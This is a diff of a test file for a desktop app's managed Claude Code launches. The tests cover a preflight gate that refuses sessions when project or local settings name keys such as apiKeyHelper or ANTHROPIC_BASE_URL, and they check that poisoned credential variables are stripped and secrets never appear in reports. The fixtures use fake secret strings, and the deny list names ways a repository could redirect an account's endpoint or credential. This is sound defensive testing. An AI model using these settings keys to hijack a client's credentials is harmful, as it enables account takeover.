-      expect(notScanned!.detail).toMatch(/network path/)
-      expect(notScanned!.detail, 'the finding must still say the control applies').toMatch(/still suppressed/)
-      // ...and a scan for a LOCAL directory still runs right afterwards, so the
-      // refusal did not leave the single-flight flag stuck.
-      const local = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
-      try {
-        fs.mkdirSync(path.join(local, '.claude'))
-        fs.writeFileSync(path.join(local, '.claude', 'settings.json'), JSON.stringify({ apiKeyHelper: 'x' }))
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-local', cwd: local })
-        await settled(true)
-        expect(diag.listManagedLaunchReports('p1')[0].preflight.findings.map((f) => f.id))
-          .toContain('repository-settings-suppressed')
-      } finally {
-        try { fs.rmSync(local, { recursive: true, force: true }) } catch { /* ignore */ }
-      }
-    })
-
     it('a probe can never EVICT a real launch from the ring', () => {
       // One shared ring meant the auth-status probe this app fires on every
       // Accounts row mount pushed real launches out: sixteen panel opens on a
@@ -1859,8 +1912,9 @@ describe('the launch paths', () => {
         throw new Error('synthetic diagnostic failure')
       })
       try {
-        const env = withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-ambient-throws' })
-        expect(env[HOST_KEY], 'the launch was refused by a diagnostic').toBe('1')
+        const env = withProfileHome({ PATH: '/x', ANTHROPIC_API_KEY: 'sk-poison' }, HOME, { launchId: 's-ambient-throws' })
+        expect(env.USERPROFILE, 'the launch was refused by a diagnostic').toBe(HOME)
+        expect(env.ANTHROPIC_API_KEY, 'the hardening was lost with the diagnostic').toBeUndefined()
       } finally {
         spy.mockRestore()
       }
@@ -1878,8 +1932,9 @@ describe('the launch paths', () => {
         throw new Error('synthetic diagnostic failure')
       })
       try {
-        const env = withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-throws' })
-        expect(env[HOST_KEY], 'the launch was refused by a diagnostic').toBe('1')
+        const env = withProfileHome({ PATH: '/x', ANTHROPIC_API_KEY: 'sk-poison' }, HOME, { launchId: 's-throws' })
+        expect(env.USERPROFILE, 'the launch was refused by a diagnostic').toBe(HOME)
+        expect(env.ANTHROPIC_API_KEY, 'the hardening was lost with the diagnostic').toBeUndefined()
         expect(diag.listManagedLaunchReports('p1')).toEqual([])
       } finally {
         spy.mockRestore()
@@ -1895,7 +1950,7 @@ describe('the launch paths', () => {
     const inherited = { PATH: '/x', ANTHROPIC_API_KEY: 'mine' }
     const env = withProfileHome(inherited, null)
     expect(env).toBe(inherited)
-    expect(env[HOST_KEY]).toBeUndefined()
+    expect(env.USERPROFILE).toBeUndefined()
     expect(env.ANTHROPIC_API_KEY).toBe('mine')
   })
 
@@ -1944,6 +1999,44 @@ describe('the launch paths', () => {
     // left open (adversarial round 4).
     const undecided = withProfileHomeCallsWithoutProbeDecision(productionSourceFiles())
     expect(undecided, `these managed launches never say whether they are a probe, so the Accounts panel cannot tell them from the user's own session:\n${undecided.join('\n')}`).toEqual([])
+  })
+
+  it('...and every launch that names a DIRECTORY states what the project gate decided about it', () => {
+    // The gate is asynchronous, so it cannot live inside the synchronous choke
+    // point: the caller awaits it and hands the verdict in. That makes "did this
+    // launch run the gate?" a property of the CALL, and a call site that names a
+    // directory without one is a launch that would be refused at run time --
+    // which is a crash rather than a hole, but a crash nobody sees until a user
+    // starts a session from that path.
+    const src = productionSourceFiles()
+    const undecided = withProfileHomeCallsWithoutGateDecision(src)
+    expect(undecided, `these managed launches name a working directory but never say what the project-settings gate decided about it:\n${undecided.join('\n')}`).toEqual([])
+    // ...and the result is not vacuous. An empty list is only meaningful if the
+    // scan found call sites that DO name a directory: a regex that matched
+    // nothing would pass this the same way, which is how a guard becomes
+    // decoration without anybody editing it.
+    const naming = withProfileHomeCallSites(src).filter((c) => /\bcwd\s*[:,}]/.test(c.args))
+    expect(naming.length, 'the scan found no managed launch naming a working directory at all').toBeGreaterThanOrEqual(5)
+  })
+
+  it('...and THAT guard goes red on a call site with a `cwd` and no `projectGate`', () => {
+    // Verify-the-verifier. A source-scanning guard nobody has seen fail is
+    // decoration.
+    const call = (text: string) => withProfileHomeCallsWithoutGateDecision([{ path: 'src/main/rogue.ts', text }])
+    expect(call("withProfileHome(env, home, { launchId: 'x', cwd: dir })")).toEqual(['src/main/rogue.ts:1'])
+    expect(call("withProfileHome(env, home, { launchId: 'x', cwd: dir, projectGate: verdict })")).toEqual([])
+    // The SHORTHAND spelling, which two production call sites use. A rule that
+    // knew only `cwd:` exempted exactly those two.
+    expect(call("withProfileHome(env, home, { launchId: 'x', cwd })")).toEqual(['src/main/rogue.ts:1'])
+    expect(call("withProfileHome(env, home, { launchId: 'x', cwd, probe: true })")).toEqual(['src/main/rogue.ts:1'])
+    expect(call("withProfileHome(env, home, { launchId: 'x', cwd, projectGate })")).toEqual([])
+    // The real call site's shape, verdict defaulted rather than omitted.
+    expect(call("withProfileHome(env, home, { launchId: sessionId, cwd: resolvedCwd, probe: false, projectGate: options?.projectGate ?? null })")).toEqual([])
+    // A launch with no directory has nothing to gate and is not an offender.
+    expect(call("withProfileHome(env, home, { launchId: 'auth-status', probe: true })")).toEqual([])
+    // Multi-line call sites are read whole, not line by line.
+    expect(call('withProfileHome(\n  base,\n  home,\n  { launchId: id, cwd },\n)')).toEqual(['src/main/rogue.ts:1'])
+    expect(call('withProfileHome(\n  base,\n  home,\n  { launchId: id, cwd, projectGate: verdict },\n)')).toEqual([])
   })
 
   it('...and THAT guard goes red on a call site that omits `probe`', () => {
@@ -2235,26 +2328,15 @@ describe('the launch paths', () => {
 // Layer 4: the preflight.
 // ---------------------------------------------------------------------------
 describe('the managed-launch preflight', () => {
-  const good = { [HOST_KEY]: '1' }
+  /** A composed launch environment with nothing wrong in it. The host-managed
+   *  flag is deliberately NOT in it: there is none to look for, and a preflight
+   *  that required one would be asserting the mechanism gate A1 removed. */
+  const good = { PATH: '/x' }
 
-  it('passes when the control is present and the CLI is at the floor', () => {
+  it('reports NOTHING when the CLI is at the floor and no layer found anything', () => {
     const p = claudeManagedLaunchPreflight({ env: good, cliVersion: CLAUDE_MIN_MANAGED_CLI_VERSION })
     expect(p.ok).toBe(true)
     expect(p.findings).toEqual([])
-  })
-
-  it('BLOCKS when the control is missing -- the failure is otherwise invisible', () => {
-    const p = claudeManagedLaunchPreflight({ env: { PATH: '/x' }, cliVersion: '2.1.278' })
-    expect(p.ok).toBe(false)
-    const f = p.findings.find((x) => x.id === 'host-control-missing')!
-    expect(f.severity).toBe('blocked')
-    expect(f.action).toBeTruthy()
-  })
-
-  it('BLOCKS when the control carries an unexpected value', () => {
-    const p = claudeManagedLaunchPreflight({ env: { [HOST_KEY]: '0' }, cliVersion: '2.1.278' })
-    expect(p.findings.map((f) => f.id)).toContain('host-control-altered')
-    expect(p.ok).toBe(false)
   })
 
   it('BLOCKS on a CLI below the verified floor, with an actionable upgrade step', () => {
@@ -2271,18 +2353,43 @@ describe('the managed-launch preflight', () => {
     expect(p.compatibility.state).toBe('unknown')
   })
 
-  it('does NOT block on project/local settings the proven mechanism suppresses', () => {
-    // The owner's constraint, and the reason it matters: those files are not
-    // ours to change, and the host control already suppresses them. Failing a
-    // launch over one would make a working configuration unlaunchable.
+  it('BLOCKS on project/local settings that could redirect the account, because nothing suppresses them', () => {
+    // Owner decision, 2026-09-22, REVERSING the 2026-09-21 ruling that a launch
+    // must not be refused for settings the host control suppressed: there is no
+    // host control now, and on 2.1.278 without one a project or local `env`
+    // block DOES redirect the endpoint and switch the provider, and an
+    // `apiKeyHelper` from either scope executes and supplies the credential
+    // (evidence Part 8). So a detectable override fails VISIBLY before the
+    // session starts rather than being reported as handled.
     const p = claudeManagedLaunchPreflight({
       env: good,
       cliVersion: '2.1.278',
-      repositorySettingsKeys: ['apiKeyHelper', 'env.ANTHROPIC_BASE_URL'],
+      repositorySettingsKeys: ['settings.json: apiKeyHelper', 'settings.local.json: env.ANTHROPIC_BASE_URL'],
     })
-    expect(p.ok).toBe(true)
-    const f = p.findings.find((x) => x.id === 'repository-settings-suppressed')!
-    expect(f.severity).toBe('info')
+    expect(p.ok).toBe(false)
+    const f = p.findings.find((x) => x.id === 'repository-settings-refused')!
+    expect(f.severity).toBe('blocked')
+    expect(f.action, 'a blocked finding with no action is a dead end').toBeTruthy()
+    expect(f.detail).toContain('settings.json: apiKeyHelper')
+    expect(f.detail).toContain('settings.local.json: env.ANTHROPIC_BASE_URL')
+  })
+
+  it('WARNS, and does not block, when the gate could not answer for this launch', () => {
+    // The third severity. The gate declines on a network path, at its thread
+    // ceiling and at its deadline -- and a report that then said nothing read
+    // exactly like "this project carries nothing" (code-quality review, MAJOR).
+    // An unscannable directory is a recorded residual, not a refusal.
+    for (const reason of ['network-path', 'thread-ceiling', 'timed-out'] as const) {
+      const p = claudeManagedLaunchPreflight({ env: good, cliVersion: '2.1.278', projectScanSkipped: reason })
+      expect(p.ok, reason).toBe(true)
+      const f = p.findings.find((x) => x.id === 'project-settings-not-scanned')!
+      expect(f, reason).toBeDefined()
+      expect(f.severity, reason).toBe('warning')
+      // Each reason says what happened in its own words, and every one of them
+      // tells the reader what they can do instead.
+      expect(f.detail.length, reason).toBeGreaterThan(40)
+      expect(f.action, reason).toBeTruthy()
+    }
   })
 
   it('reports what the sanitiser removed, without failing the launch', () => {
@@ -2318,56 +2425,38 @@ describe('the managed-launch preflight', () => {
     expect(f.detail).toMatch(/ANTHROPIC_BASE_URL/)
   })
 
-  it('checks the declared host control on the SHIPPED declaration', () => {
-    // What this can prove with the production declaration, which has exactly
-    // one entry. The "every" claim is the test below; conflating the two is how
-    // a one-entry loop came to read as multi-control coverage (MINOR).
-    expect(Object.keys(CLAUDE_HOST_MANAGED_ENV)).toHaveLength(1)
-    const p = claudeManagedLaunchPreflight({ env: { [HOST_KEY]: '1' }, cliVersion: '2.1.278' })
-    expect(p.findings.filter((f) => f.id.startsWith('host-control-')).length).toBe(0)
-    const missing = claudeManagedLaunchPreflight({ env: {}, cliVersion: '2.1.278' })
-    expect(missing.findings.filter((f) => f.id === 'host-control-missing').length)
-      .toBe(Object.keys(CLAUDE_HOST_MANAGED_ENV).length)
-  })
-
-  it('checks EVERY declared host control, not just the first -- proven on a TWO-control set', () => {
-    // Against the production declaration this assertion was vacuous: one entry,
-    // so `[0]` and "all of them" are the same loop. Driven through the seam, a
-    // second control that is absent is reported while the first one holds --
-    // which is the regression the loop exists to catch.
-    const two = { [HOST_KEY]: '1', CLAUDE_CODE_SECOND_CONTROL: '1' }
-    const p = _claudeManagedLaunchPreflightAgainstControls({ env: { [HOST_KEY]: '1' }, cliVersion: '2.1.278' }, two)
-    const missing = p.findings.filter((f) => f.id === 'host-control-missing')
-    expect(missing).toHaveLength(1)
-    expect(missing[0].detail).toContain('CLAUDE_CODE_SECOND_CONTROL')
-    // Both present -> nothing reported. Both absent -> both reported.
-    expect(_claudeManagedLaunchPreflightAgainstControls({ env: two, cliVersion: '2.1.278' }, two)
-      .findings.filter((f) => f.id.startsWith('host-control-'))).toEqual([])
-    expect(_claudeManagedLaunchPreflightAgainstControls({ env: {}, cliVersion: '2.1.278' }, two)
-      .findings.filter((f) => f.id === 'host-control-missing')).toHaveLength(2)
-  })
-
-  it('reports an EMPTY declaration as a blocked finding -- the branch the shipped set cannot reach', () => {
-    // `host-control-undeclared` was unreachable: the production declaration is
-    // never empty, so no test going through it could execute the branch, and a
-    // test named for it proved only that the shipped set is non-empty (MINOR).
-    const p = _claudeManagedLaunchPreflightAgainstControls({ env: {}, cliVersion: '2.1.278' }, {})
-    const undeclared = p.findings.find((f) => f.id === 'host-control-undeclared')
-    expect(undeclared, 'an empty control set must be a finding of its own').toBeDefined()
-    expect(undeclared!.severity).toBe('blocked')
-    expect(undeclared!.action, 'a blocked finding with no action is a dead end').toBeTruthy()
+  it('reports a refusal and an unscanned directory TOGETHER, and the refusal wins `ok`', () => {
+    // Not a shape production produces -- the gate returns one verdict -- but the
+    // preflight takes the two fields independently, so a future caller that
+    // reported both must not get an `ok: true` record with a blocked finding on
+    // it. `ok` is derived from the findings, not tracked alongside them.
+    const p = claudeManagedLaunchPreflight({
+      env: good, cliVersion: '2.1.278',
+      repositorySettingsKeys: ['settings.json: apiKeyHelper'],
+      projectScanSkipped: 'timed-out',
+    })
+    expect(p.findings.map((f) => f.id)).toEqual(
+      expect.arrayContaining(['repository-settings-refused', 'project-settings-not-scanned']),
+    )
     expect(p.ok).toBe(false)
-    // ...and it does not silently pass as "nothing missing" either.
-    expect(p.findings.filter((f) => f.id === 'host-control-missing')).toEqual([])
   })
 
   it('survives an env of null/undefined rather than throwing on the spawn path', () => {
     expect(() => claudeManagedLaunchPreflight({ env: undefined as never })).not.toThrow()
   })
 
-  it('reads the control case-insensitively, so it reports honestly either way', () => {
-    const p = claudeManagedLaunchPreflight({ env: { claude_code_provider_managed_by_host: '1' }, cliVersion: '2.1.278' })
-    expect(p.findings.map((f) => f.id)).not.toContain('host-control-missing')
+  it('never names the host-managed flag, in any finding -- the mechanism is gone', () => {
+    // A preflight that still talked about a control nobody applies would send
+    // the reader after a setting they cannot change and this app no longer sets.
+    const p = claudeManagedLaunchPreflight({
+      env: { [HOST_KEY]: '0' }, cliVersion: '1.0.0',
+      sanitizedSettings: { removed: [], refused: 'bad' },
+      repositorySettingsKeys: ['settings.json: apiKeyHelper'],
+      projectScanSkipped: 'network-path',
+      strippedAmbient: ['ANTHROPIC_BASE_URL'],
+    })
+    expect(JSON.stringify(p)).not.toContain(HOST_KEY)
+    expect(p.findings.filter((f) => f.id.startsWith('host-control-'))).toEqual([])
   })
 
   it('every blocked finding carries an action; no dead ends', () => {
@@ -2397,24 +2486,39 @@ describe('the managed-launch diagnostics recorder', () => {
   beforeEach(() => { diag._resetManagedLaunchReportsForTest() })
 
   it('records a report per managed launch, newest first', () => {
-    diag.recordManagedLaunchPreflight('s1', 'pA', '/home/a', { [HOST_KEY]: '1' })
-    diag.recordManagedLaunchPreflight('s2', 'pA', '/home/b', { [HOST_KEY]: '1' })
+    diag.recordManagedLaunchPreflight('s1', 'pA', '/home/a', { PATH: '/x' })
+    diag.recordManagedLaunchPreflight('s2', 'pA', '/home/b', { PATH: '/x' })
     expect(diag.listManagedLaunchReports('pA').map((r) => r.sessionId)).toEqual(['s2', 's1'])
   })
 
-  it('reports a MISSING control rather than swallowing it', () => {
-    const p = diag.recordManagedLaunchPreflight('s3', 'pA', '/home/a', { PATH: '/x' })
-    expect(p?.ok).toBe(false)
-    expect(p?.findings.map((f) => f.id)).toContain('host-control-missing')
+  it('records the GATE VERDICT it was handed, rather than deciding anything itself', () => {
+    // The gate has already answered by the time this runs -- its result is
+    // passed in -- so nothing here touches the filesystem and the refusal itself
+    // belongs to the caller. What the recorder owes is that the verdict reaches
+    // the report at the right severity.
+    const refused = diag.recordManagedLaunchPreflight('s3', 'pA', '/home/a', { PATH: '/x' }, { status: 'refused', keys: ['settings.json: apiKeyHelper'] })
+    expect(refused?.ok).toBe(false)
+    expect(refused?.findings.find((f) => f.id === 'repository-settings-refused')?.severity).toBe('blocked')
+
+    const notScanned = diag.recordManagedLaunchPreflight('s4', 'pA', '/home/a', { PATH: '/x' }, { status: 'not-scanned', reason: 'network-path' })
+    expect(notScanned?.findings.find((f) => f.id === 'project-settings-not-scanned')?.severity).toBe('warning')
+
+    // `null` is a launch with no directory to gate, and says nothing about
+    // project settings either way -- which is honest for a launch that inherits
+    // the app's own directory.
+    const none = diag.recordManagedLaunchPreflight('s5', 'pA', '/home/a', { PATH: '/x' }, null)
+    expect(none?.findings.map((f) => f.id)).not.toContain('project-settings-not-scanned')
+    expect(none?.findings.map((f) => f.id)).not.toContain('repository-settings-refused')
   })
 
   it('never throws on the spawn path, whatever it is handed', () => {
     // A diagnostic that can break a launch is worse than no diagnostic.
-    expect(() => diag.recordManagedLaunchPreflight('s4', 'pA', '/home/a', null as never)).not.toThrow()
+    expect(() => diag.recordManagedLaunchPreflight('s6', 'pA', '/home/a', null as never)).not.toThrow()
+    expect(() => diag.recordManagedLaunchPreflight('s7', 'pA', '/home/a', { PATH: '/x' }, {} as never)).not.toThrow()
   })
 
   it('is bounded, so a long-running app cannot accumulate one per session forever', () => {
-    for (let i = 0; i < 120; i++) diag.recordManagedLaunchPreflight(`s${i}`, 'pA', '/home/a', { [HOST_KEY]: '1' })
+    for (let i = 0; i < 120; i++) diag.recordManagedLaunchPreflight(`s${i}`, 'pA', '/home/a', { PATH: '/x' })
     expect(diag.listManagedLaunchReports('pA').length).toBeLessThanOrEqual(50)
   })
 })
@@ -2523,12 +2627,9 @@ describe('D18 environment fidelity on a managed Claude launch', () => {
   it('removes every poisoned account, credential, provider and endpoint input', () => {
     const env = managedEnv()
     const lower = new Set(Object.keys(env).map((k) => k.toLowerCase()))
-    for (const name of Object.keys(POISON)) {
-      // The host control is the one name that is re-applied by design.
-      if (name.toLowerCase() === HOST_KEY.toLowerCase()) continue
-      expect(lower.has(name.toLowerCase()), name).toBe(false)
-    }
-    expect(env[HOST_KEY]).toBe('1')
+    // No exceptions. The one name that used to be re-applied by design is gone.
+    for (const name of Object.keys(POISON)) expect(lower.has(name.toLowerCase()), name).toBe(false)
+    expect(env[HOST_KEY]).toBeUndefined()
   })
 
   it('retains corporate proxy and CA configuration', () => {
@@ -2756,17 +2857,19 @@ describe('D13 settings-copy sanitising', () => {
     expect(sanitizeClaudeManagedSettings.length).toBe(1)
   })
 
-  it('leaves project and local authority to the HOST CONTROL, which every managed launch applies', () => {
-    // The sanitiser only owns the copy AICC writes. Project and local settings
-    // are repository- and user-owned and must never be modified, so the only
-    // defence there is CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST -- probed to
-    // suppress an apiKeyHelper supplied from BOTH project and local scope
-    // (the helper does not run and the host key is what reaches the wire).
-    _resetProviderRegistryForTest()
-    registerProviderPackage(createClaudePackage())
-    const env = realmEnvForProvider('claude', { PATH: '/x' }, { set: { USERPROFILE: '/home/a' } })
-    expect(env[HOST_KEY]).toBe('1')
-    _resetProviderRegistryForTest()
+  it('leaves project and local authority to the GATE, which REFUSES rather than editing them', () => {
+    // The sanitiser owns only the copy AICC writes. Project and local settings
+    // are repository- and user-owned and are never modified -- so the defence
+    // there is the launch gate, which reads them and refuses the session. The
+    // linkage asserted here is that the sanitiser's own key set and the gate's
+    // classifier agree about what counts as authority, because a key the
+    // sanitiser strips from our copy but the gate ignores in a project's file is
+    // exactly the asymmetry that made the old host control necessary.
+    for (const key of CLAUDE_REMOVED_SETTINGS_KEYS) {
+      expect(claudeAuthoritySettingsKeys(JSON.stringify({ [key]: 'x' })), key).toEqual([key])
+    }
+    // ...and the classifier never writes: it takes text and returns names.
+    expect(claudeAuthoritySettingsKeys.length).toBe(1)
   })
 
   it('keeps the preserved settings in the copy Claude actually reads', () => {
@@ -2804,8 +2907,8 @@ describe('the managed-launch report channel is scoped to one account', () => {
   afterEach(() => { diag._resetManagedLaunchReportsForTest() })
 
   it('returns only the requesting profile\'s reports', () => {
-    diag.recordManagedLaunchPreflight('sA', 'profile-a', '/home/a', { [HOST_KEY]: '1' })
-    diag.recordManagedLaunchPreflight('sB', 'profile-b', '/home/b', { [HOST_KEY]: '1' })
+    diag.recordManagedLaunchPreflight('sA', 'profile-a', '/home/a', { PATH: '/x' })
+    diag.recordManagedLaunchPreflight('sB', 'profile-b', '/home/b', { PATH: '/x' })
 
     const a = diag.listManagedLaunchReports('profile-a')
     const b = diag.listManagedLaunchReports('profile-b')
@@ -2815,7 +2918,7 @@ describe('the managed-launch report channel is scoped to one account', () => {
   })
 
   it('never puts the absolute profile home -- and so the OS username -- on the wire', () => {
-    diag.recordManagedLaunchPreflight('sA', 'profile-a', '/home/someuser/.ccc/profile-a', { [HOST_KEY]: '1' })
+    diag.recordManagedLaunchPreflight('sA', 'profile-a', '/home/someuser/.ccc/profile-a', { PATH: '/x' })
     const [report] = diag.listManagedLaunchReports('profile-a')
     expect(report).toBeDefined()
     expect(JSON.stringify(report)).not.toContain('someuser')
@@ -2835,7 +2938,7 @@ describe('the managed-launch report channel is scoped to one account', () => {
   // mutant that proves this test load-bearing removes the guard AND makes the
   // filter truthiness-based, which is the realistic bug; it goes red here.
   it('returns nothing for a missing or non-string profile id, rather than everything', () => {
-    diag.recordManagedLaunchPreflight('sA', 'profile-a', '/home/a', { [HOST_KEY]: '1' })
+    diag.recordManagedLaunchPreflight('sA', 'profile-a', '/home/a', { PATH: '/x' })
     expect(diag.listManagedLaunchReports('')).toEqual([])
     expect(diag.listManagedLaunchReports(undefined as never)).toEqual([])
     expect(diag.listManagedLaunchReports(null as never)).toEqual([])
@@ -2844,7 +2947,7 @@ describe('the managed-launch report channel is scoped to one account', () => {
 
   it('keeps the ring buffer bound PER PROCESS, not per profile', () => {
     for (let i = 0; i < 120; i += 1) {
-      diag.recordManagedLaunchPreflight(`s${i}`, 'profile-a', '/home/a', { [HOST_KEY]: '1' })
+      diag.recordManagedLaunchPreflight(`s${i}`, 'profile-a', '/home/a', { PATH: '/x' })
     }
     expect(diag.listManagedLaunchReports('profile-a').length).toBeLessThanOrEqual(50)
   })
@@ -2852,28 +2955,50 @@ describe('the managed-launch report channel is scoped to one account', () => {
 
 // ---------------------------------------------------------------------------
 // MAJOR 6 (adversarial review): "a finding names variables and settings KEYS,
-// never their values" was false as written. `host-control-altered` interpolated
-// the OBSERVED environment value verbatim into a string that reaches a renderer
-// surface. Bounded today, because the only host key is our own frozen literal --
-// but the next entry added to CLAUDE_HOST_MANAGED_ENV inherits the line.
+// never their values" was false as written -- a finding interpolated an OBSERVED
+// environment value verbatim into a string that reaches a renderer surface. The
+// finding that did it is gone with the host control, but the rule outlived it
+// and now has more surfaces to hold: the refusal text reaches a TERMINAL and the
+// session transcript as well as the panel, and the preflight is handed the full
+// composed launch environment, values included.
 // ---------------------------------------------------------------------------
 describe('preflight findings never carry an observed VALUE', () => {
-  it('reports that the host control diverged without quoting what it holds', () => {
-    const secret = 'sk-ant-api03-LOOKS-LIKE-A-REAL-SECRET'
-    const preflight = claudeManagedLaunchPreflight({ env: { [HOST_KEY]: secret }, cliVersion: CLAUDE_MIN_MANAGED_CLI_VERSION })
-    const altered = preflight?.findings.find((f) => f.id === 'host-control-altered')
-    expect(altered).toBeDefined()
-    expect(altered!.detail).not.toContain(secret)
-    expect(altered!.detail).not.toContain('sk-ant')
-    // The actionable facts survive: which control, and that it is not ours.
-    expect(altered!.detail).toContain(HOST_KEY)
-    expect(altered!.severity).toBe('blocked')
+  it('names the project settings key that refused the launch without quoting the value beside it', () => {
+    // The refusal is the finding that travels furthest: into a terminal, into
+    // the session transcript, over IPC and onto the Accounts panel. The gate
+    // produces NAMES ONLY, so there is nothing for this to quote -- and the
+    // assertion is that the finding text adds nothing back.
+    const preflight = claudeManagedLaunchPreflight({
+      env: { PATH: '/x' },
+      cliVersion: CLAUDE_MIN_MANAGED_CLI_VERSION,
+      repositorySettingsKeys: ['settings.json: apiKeyHelper', 'settings.local.json: env.ANTHROPIC_API_KEY'],
+    })
+    const refused = preflight.findings.find((f) => f.id === 'repository-settings-refused')!
+    expect(refused).toBeDefined()
+    expect(refused.severity).toBe('blocked')
+    // The actionable facts survive: which file, which key, and what to do.
+    expect(refused.detail).toContain('settings.json: apiKeyHelper')
+    expect(refused.action).toMatch(/settings\.local\.json/)
   })
 
-  it('carries no observed value anywhere in the whole preflight payload', () => {
-    const secret = 'sk-ant-api03-ANOTHER-SECRET'
-    const preflight = claudeManagedLaunchPreflight({ env: { [HOST_KEY]: secret }, cliVersion: CLAUDE_MIN_MANAGED_CLI_VERSION })
+  it('carries no observed VALUE anywhere in the whole preflight payload', () => {
+    // Every field the preflight takes, loaded with something that looks like a
+    // credential, and none of it may reach the payload. The env is the trap: it
+    // is the FULL composed launch environment, values included, and the
+    // preflight reads it.
+    const secret = 'sk-ant-api03-LOOKS-LIKE-A-REAL-SECRET'
+    const preflight = claudeManagedLaunchPreflight({
+      env: { ANTHROPIC_API_KEY: secret, PATH: '/x' },
+      cliVersion: CLAUDE_MIN_MANAGED_CLI_VERSION,
+      sanitizedSettings: { removed: ['apiKeyHelper', 'env.ANTHROPIC_API_KEY'] },
+      strippedAmbient: ['ANTHROPIC_API_KEY'],
+      repositorySettingsKeys: ['settings.json: apiKeyHelper'],
+    })
     expect(JSON.stringify(preflight)).not.toContain(secret)
+    expect(JSON.stringify(preflight)).not.toContain('sk-ant')
+    // ...and the NAMES it does report are still there, or this would pass by
+    // reporting nothing at all.
+    expect(JSON.stringify(preflight)).toContain('apiKeyHelper')
   })
 })
 
